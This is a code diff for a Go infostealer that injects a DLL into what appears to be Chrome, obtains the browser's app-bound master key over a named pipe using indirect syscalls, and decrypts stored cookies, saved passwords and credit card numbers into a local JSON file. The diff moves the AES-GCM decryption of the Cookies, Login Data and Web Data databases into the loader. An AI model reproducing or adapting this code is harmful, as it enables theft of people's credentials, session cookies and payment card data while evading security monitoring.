@@ -1,6 +1,11 @@
 package main
 
 import (
+	"crypto/aes"
+	"crypto/cipher"
+	"database/sql"
+	"encoding/base64"
+	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"os"
@@ -14,6 +19,7 @@ import (
 	"github.com/carved4/gobound/pkg/net"
 
 	wc "github.com/carved4/go-wincall"
+	_ "modernc.org/sqlite"
 )
 
 const (
@@ -344,54 +350,13 @@ outerLoop:
 	if err != nil {
 		panic(err)
 	}
-	err = loader.LoadDLLRemote(hProcess, dllBytes)
-	if err != nil {
+
+	if err := loader.LoadDLLRemote(hProcess, dllBytes); err != nil {
 		panic(err)
 	}
 	wc.CallG0(connectNamedPipe, hPipe, uintptr(0))
-	for dbType, tmpPath := range tempFiles {
-		msg := fmt.Sprintf("TEMPFILE:%s|%s\n", dbType, tmpPath)
-		data := []byte(msg)
-		var iosb IoStatusBlock
-		wc.IndirectSyscall(
-			writeFile.SSN,
-			writeFile.Address,
-			hPipe,
-			uintptr(0),
-			uintptr(0),
-			uintptr(0),
-			uintptr(unsafe.Pointer(&iosb)),
-			uintptr(unsafe.Pointer(&data[0])),
-			uintptr(len(data)),
-			uintptr(0),
-			uintptr(0),
-		)
-		time.Sleep(100 * time.Millisecond)
-	}
 
-	doneMsg := []byte("READY\x00")
-	var iosbDone IoStatusBlock
-	wc.IndirectSyscall(
-		writeFile.SSN,
-		writeFile.Address,
-		hPipe,
-		uintptr(0),
-		uintptr(0),
-		uintptr(0),
-		uintptr(unsafe.Pointer(&iosbDone)),
-		uintptr(unsafe.Pointer(&doneMsg[0])),
-		uintptr(len(doneMsg)),
-		uintptr(0),
-		uintptr(0),
-	)
-
-	output := Output{
-		Timestamp: time.Now().Format(time.RFC3339),
-		Cookies:   []Cookie{},
-		Passwords: []Password{},
-		Cards:     []Card{},
-	}
-
+	var masterKey []byte
 	buf := make([]byte, 4096)
 	for {
 		var bytesRead uint32
@@ -415,45 +380,10 @@ outerLoop:
 		}
 		msg := string(buf[:msgLen])
 		if strings.HasPrefix(msg, "KEY:") {
-			output.MasterKey = strings.TrimPrefix(msg, "KEY:")
-		} else if strings.HasPrefix(msg, "COOKIE:") {
-			data := strings.TrimPrefix(msg, "COOKIE:")
-			if profile, rest, ok := parseProfile(data); ok {
-				parts := strings.SplitN(rest, "|", 3)
-				if len(parts) == 3 {
-					output.Cookies = append(output.Cookies, Cookie{
-						Profile: profile,
-						Host:    parts[0],
-						Name:    parts[1],
-						Value:   parts[2],
-					})
-				}
-			}
-		} else if strings.HasPrefix(msg, "PASSWORD:") {
-			data := strings.TrimPrefix(msg, "PASSWORD:")
-			if profile, rest, ok := parseProfile(data); ok {
-				parts := strings.SplitN(rest, "|", 3)
-				if len(parts) == 3 {
-					output.Passwords = append(output.Passwords, Password{
-						Profile:  profile,
-						URL:      parts[0],
-						Username: parts[1],
-						Password: parts[2],
-					})
-				}
-			}
-		} else if strings.HasPrefix(msg, "CARD:") {
-			data := strings.TrimPrefix(msg, "CARD:")
-			if profile, rest, ok := parseProfile(data); ok {
-				parts := strings.SplitN(rest, "|", 3)
-				if len(parts) == 3 {
-					output.Cards = append(output.Cards, Card{
-						Profile:    profile,
-						NameOnCard: parts[0],
-						Expiration: parts[1],
-						Number:     parts[2],
-					})
-				}
+			keyHex := strings.TrimPrefix(msg, "KEY:")
+			masterKey, err = hex.DecodeString(keyHex)
+			if err != nil {
+				panic(fmt.Sprintf("failed to decode master key: %v", err))
 			}
 		} else if msg == "DONE" {
 			break
@@ -462,6 +392,38 @@ outerLoop:
 
 	wc.CallG0(closeHandle, hPipe)
 	wc.CallG0(closeHandle, hProcess)
+
+	if len(masterKey) == 0 {
+		panic("failed to retrieve master key from DLL")
+	}
+
+	println("[+] decrypting databases...")
+	output := Output{
+		Timestamp: time.Now().Format(time.RFC3339),
+		MasterKey: fmt.Sprintf("%X", masterKey),
+		Cookies:   []Cookie{},
+		Passwords: []Password{},
+		Cards:     []Card{},
+	}
+
+	// Process databases locally
+	if cookiesPath, ok := tempFiles["Cookies"]; ok {
+		cookies := extractCookies(masterKey, cookiesPath, "Default")
+		output.Cookies = append(output.Cookies, cookies...)
+		os.Remove(cookiesPath)
+	}
+
+	if loginPath, ok := tempFiles["Login Data"]; ok {
+		passwords := extractPasswords(masterKey, loginPath, "Default")
+		output.Passwords = append(output.Passwords, passwords...)
+		os.Remove(loginPath)
+	}
+
+	if webDataPath, ok := tempFiles["Web Data"]; ok {
+		cards := extractCards(masterKey, webDataPath, "Default")
+		output.Cards = append(output.Cards, cards...)
+		os.Remove(webDataPath)
+	}
 
 	jsonData, _ := json.MarshalIndent(output, "", "  ")
 	os.WriteFile("chrome_data.json", jsonData, 0644)
@@ -472,15 +434,169 @@ func main() {
 	injectDLL()
 }
 
-func parseProfile(data string) (profile, rest string, ok bool) {
-	if !strings.HasPrefix(data, "[") {
-		return "", data, false
+func decryptAESGCM(key, encrypted []byte) ([]byte, error) {
+	if len(encrypted) < 3+12+16 {
+		return nil, fmt.Errorf("encrypted data too short")
 	}
-	end := strings.Index(data, "]")
-	if end == -1 {
-		return "", data, false
+	nonce := encrypted[3:15]
+	ciphertext := encrypted[15:]
+
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return nil, err
 	}
-	return data[1:end], data[end+1:], true
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return nil, err
+	}
+	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
+	if err != nil {
+		return nil, err
+	}
+	return plaintext, nil
+}
+
+func extractCookies(masterKey []byte, dbPath string, profile string) []Cookie {
+	var cookies []Cookie
+	uri := "file:" + dbPath + "?mode=ro"
+	db, err := sql.Open("sqlite", uri)
+	if err != nil {
+		return cookies
+	}
+	defer db.Close()
+
+	rows, err := db.Query("SELECT host_key, name, encrypted_value FROM cookies")
+	if err != nil {
+		return cookies
+	}
+	defer rows.Close()
+
+	for rows.Next() {
+		var host, name string
+		var encValue []byte
+		if err := rows.Scan(&host, &name, &encValue); err != nil {
+			continue
+		}
+
+		if len(encValue) < 3 {
+			continue
+		}
+
+		prefix := string(encValue[:3])
+		if prefix == "v20" {
+			decrypted, err := decryptAESGCM(masterKey, encValue)
+			if err != nil {
+				continue
+			}
+			if len(decrypted) > 32 {
+				decrypted = decrypted[32:]
+			}
+			value := base64.StdEncoding.EncodeToString(decrypted)
+			cookies = append(cookies, Cookie{
+				Profile: profile,
+				Host:    host,
+				Name:    name,
+				Value:   value,
+			})
+		}
+	}
+
+	return cookies
+}
+
+func extractPasswords(masterKey []byte, dbPath string, profile string) []Password {
+	var passwords []Password
+	uri := "file:" + dbPath + "?mode=ro"
+	db, err := sql.Open("sqlite", uri)
+	if err != nil {
+		return passwords
+	}
+	defer db.Close()
+
+	rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
+	if err != nil {
+		return passwords
+	}
+	defer rows.Close()
+
+	for rows.Next() {
+		var url, username string
+		var encPassword []byte
+		if err := rows.Scan(&url, &username, &encPassword); err != nil {
+			continue
+		}
+
+		if len(encPassword) < 3 {
+			continue
+		}
+
+		prefix := string(encPassword[:3])
+		if prefix == "v20" {
+			decrypted, err := decryptAESGCM(masterKey, encPassword)
+			if err != nil {
+				continue
+			}
+			if len(decrypted) > 32 {
+				decrypted = decrypted[32:]
+			}
+			passwords = append(passwords, Password{
+				Profile:  profile,
+				URL:      url,
+				Username: username,
+				Password: string(decrypted),
+			})
+		}
+	}
+
+	return passwords
+}
+
+func extractCards(masterKey []byte, dbPath string, profile string) []Card {
+	var cards []Card
+	uri := "file:" + dbPath + "?mode=ro"
+	db, err := sql.Open("sqlite", uri)
+	if err != nil {
+		return cards
+	}
+	defer db.Close()
+
+	rows, err := db.Query("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
+	if err != nil {
+		return cards
+	}
+	defer rows.Close()
+
+	for rows.Next() {
+		var nameOnCard string
+		var expMonth, expYear int
+		var encCardNumber []byte
+		if err := rows.Scan(&nameOnCard, &expMonth, &expYear, &encCardNumber); err != nil {
+			continue
+		}
+
+		if len(encCardNumber) < 3 {
+			continue
+		}
+
+		prefix := string(encCardNumber[:3])
+		if prefix == "v20" {
+			decrypted, err := decryptAESGCM(masterKey, encCardNumber)
+			if err != nil {
+				continue
+			}
+			if len(decrypted) > 32 {
+				decrypted = decrypted[32:]
+			}
+			cards = append(cards, Card{
+				Profile:    profile,
+				NameOnCard: nameOnCard,
+				Expiration: fmt.Sprintf("%02d/%d", expMonth, expYear),
+				Number:     string(decrypted),
+			})
+		}
+	}
+
+	return cards
 }
 
 func ScanProcesses(target string) (map[uint32][]Handle, error) {
